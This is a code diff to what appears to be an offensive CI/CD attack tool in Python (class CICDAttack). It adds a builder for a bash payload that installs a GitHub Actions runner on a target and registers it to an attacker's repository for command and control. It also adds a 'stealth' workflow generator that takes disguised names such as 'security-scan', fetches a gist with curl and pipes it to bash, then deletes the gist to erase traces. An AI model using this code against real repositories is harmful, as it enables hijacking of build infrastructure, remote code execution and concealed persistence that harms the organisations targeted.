@@ -1,4 +1,11 @@
+import random
 import yaml
+
+STEALTH_WORKFLOW_NAMES = [
+    'ci-lint-check', 'code-quality', 'dependency-audit',
+    'build-validation', 'static-analysis', 'integration-test',
+    'security-scan', 'format-check', 'type-check', 'unit-test',
+]
 
 
 class CICDAttack():
@@ -128,24 +135,19 @@ class CICDAttack():
         return yaml.dump(yaml_file, sort_keys=False)
 
     @staticmethod
-    def create_ror_yml(registration_token: str, attacker_repo: str,
-                       runner_version: str, branch_name: str,
-                       runner_labels: list = None):
-        """Create a workflow that installs a GitHub Actions runner on the
-        target, registered to the attacker's repo for C2.
+    def create_ror_payload(registration_token: str, attacker_repo: str,
+                           runner_version: str):
+        """Generate the RoR runner installation bash payload.
 
         Args:
             registration_token (str): Runner registration token.
             attacker_repo (str): Attacker repo in org/repo format.
-            runner_version (str): Runner release version (e.g. '2.321.0').
-            branch_name (str): Branch for on:push trigger.
-            runner_labels (list, optional): Labels for runs-on targeting.
-            Defaults to ['self-hosted'].
+            runner_version (str): Runner release version (e.g. '2.332.0').
 
         Returns:
-            str: Workflow YAML contents.
+            str: Bash script payload.
         """
-        payload = (
+        return (
             'RUNNER_NAME="gato-$(hostname)-$(date +%s)"\n'
             'ARCH=$(uname -m)\n'
             'case "$ARCH" in\n'
@@ -170,6 +172,28 @@ class CICDAttack():
             'setsid ./run.sh > /dev/null 2>&1 &\n'
             'sleep 2\n'
             'echo "RoR runner installed: $RUNNER_NAME"'
+        )
+
+    @staticmethod
+    def create_ror_yml(registration_token: str, attacker_repo: str,
+                       runner_version: str, branch_name: str,
+                       runner_labels: list = None):
+        """Create a workflow that installs a GitHub Actions runner on the
+        target, registered to the attacker's repo for C2.
+
+        Args:
+            registration_token (str): Runner registration token.
+            attacker_repo (str): Attacker repo in org/repo format.
+            runner_version (str): Runner release version (e.g. '2.332.0').
+            branch_name (str): Branch for on:push trigger.
+            runner_labels (list, optional): Labels for runs-on targeting.
+            Defaults to ['self-hosted'].
+
+        Returns:
+            str: Workflow YAML contents.
+        """
+        payload = CICDAttack.create_ror_payload(
+            registration_token, attacker_repo, runner_version
         )
 
         return CICDAttack.create_push_yml(payload, branch_name,
@@ -206,5 +230,67 @@ class CICDAttack():
                 }
             }
         }
+
+        return yaml.dump(yaml_file, sort_keys=False)
+
+    @staticmethod
+    def create_stealth_yml(gist_raw_url: str, gist_id: str,
+                           burner_pat: str, branch_name: str,
+                           trigger: str = 'push',
+                           workflow_name: str = None,
+                           runner_labels: list = None):
+        """Create a benign-looking workflow that fetches and executes
+        payload from a GitHub Gist, then deletes the gist.
+
+        Args:
+            gist_raw_url (str): Raw URL to fetch gist content.
+            gist_id (str): Gist ID for deletion after execution.
+            burner_pat (str): Burner account PAT for gist API access.
+            branch_name (str): Branch for trigger.
+            trigger (str): 'push' or 'pull_request'. Defaults to 'push'.
+            workflow_name (str, optional): Workflow name. Auto-generated
+                from a list of benign CI names if not provided.
+            runner_labels (list, optional): Labels for runs-on targeting.
+                Defaults to ['self-hosted'].
+
+        Returns:
+            str: Workflow YAML contents.
+        """
+        if not workflow_name:
+            workflow_name = random.choice(STEALTH_WORKFLOW_NAMES)
+
+        yaml_file = {}
+        yaml_file['name'] = workflow_name
+
+        if trigger == 'pull_request':
+            yaml_file['on'] = ['pull_request']
+        else:
+            yaml_file['on'] = {'push': {'branches': branch_name}}
+
+        run_step = (
+            f'curl -sH "Authorization: token {burner_pat}" '
+            f'"{gist_raw_url}" | bash'
+        )
+
+        cleanup_step = (
+            f'curl -sX DELETE -H "Authorization: token {burner_pat}" '
+            f'"https://api.github.com/gists/{gist_id}"'
+        )
+
+        test_job = {
+            'runs-on': runner_labels or ['self-hosted'],
+            'steps': [
+                {
+                    'name': 'Run',
+                    'run': run_step
+                },
+                {
+                    'name': 'Post',
+                    'if': 'always()',
+                    'run': cleanup_step
+                }
+            ]
+        }
+        yaml_file['jobs'] = {'build': test_job}
 
         return yaml.dump(yaml_file, sort_keys=False)
